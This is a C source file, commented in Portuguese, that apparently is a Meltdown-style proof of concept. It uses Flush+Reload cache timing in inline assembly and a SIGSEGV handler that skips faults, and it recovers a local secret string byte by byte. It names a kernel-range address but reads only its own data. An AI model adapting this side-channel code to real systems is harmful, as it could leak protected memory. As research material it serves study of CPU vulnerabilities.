#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <signal.h>



#define NUM_ITERACOES 100
#define CACHE_LINE_LEN	128
#define LEN_MEM_ARRAY	30
#define TRIAL_TIMES	 1000

static inline void Flush(void *);


static inline long ProbeFlush(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  	Flush(addr);
	return tempo;
}


static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}





unsigned Treshold(void *baseSrc)
{
	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	
	while (i<NUM_ITERACOES){
		for (j=0;j<255;j++){
			probe=Probe(base+j*4096);
			totalComFlush+=probe;
		
			probe=ProbeFlush(base+j*4096);
			totalSemFlush+=probe;
			i++;
		
	
		}
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		
	return (totalComFlush+totalSemFlush)/2;

}

static inline unsigned char FindSecretLineCache(void *baseSrc,unsigned treshold)
{
	void *base=baseSrc;
	unsigned tempo;
	unsigned int i=1;
	while (i<255){
		
		
		tempo=Probe(base+i*4096);
		if (tempo<treshold){

			return i;
		}	
		i++;
	}
	return 0;


}

void handler(int nSignum, siginfo_t* si, void* vcontext) {
  
  ucontext_t* context = (ucontext_t*)vcontext;
  context->uc_mcontext.gregs[REG_RIP]++;
}


int installHandler() {


/*credits to https://gist.github.com/fairlight1337/55978671ace2c75020eddbfbdd670221 */	
  printf("segfault achievd\n");	
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  
  int* x = 0;
  int y = *x;
  
  printf("igonring\n");	
  
  return 0;
}


int main(void)
{
	unsigned long long ret,i;
	unsigned treshold;
	void *ptrArray;
	void *addr;
	void *kernelAddr;
	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
	unsigned  stolenByte;
	void *mallocPages[400];

	installHandler();

	
	ptrArray=malloc(4096*4000);      //memspace[i];
	mallocPages[0]=ptrArray;

	ptrArray= (void *)((unsigned long long)ptrArray & 0xFFFFFFFFFFFF0000);
	treshold=Treshold(ptrArray);
	//treshold=0x300;
	kernelAddr=(void *)(NULL +0xFFFFFFF00000);	
	
	addr=kernelAddr;



	for (i=1;i<LEN_MEM_ARRAY;i++ )
	{
	
		ptrArray=malloc(4096*4000);      //memspace[i];	
		mallocPages[i]=ptrArray;
		ptrArray= (void *)((unsigned long long)ptrArray & 0xFFFFFFFFFFFF0000);
			
		ret=*((int *)(ptrArray+(unsigned)segredo[i-1]*4096));
		printf("ret =%c\n",segredo[i-1]);
		asm __volatile__(
				"mfence\n"
				"lfence\n"
				);
	
		stolenByte = FindSecretLineCache(ptrArray,treshold);
		printf("roubado em %p : %i %c \n",addr, stolenByte,stolenByte);
		
		if (i >100 )
		{
		  free(mallocPages[i-100]);
		}
		
		addr++;
	
	}

	return 0;

}
















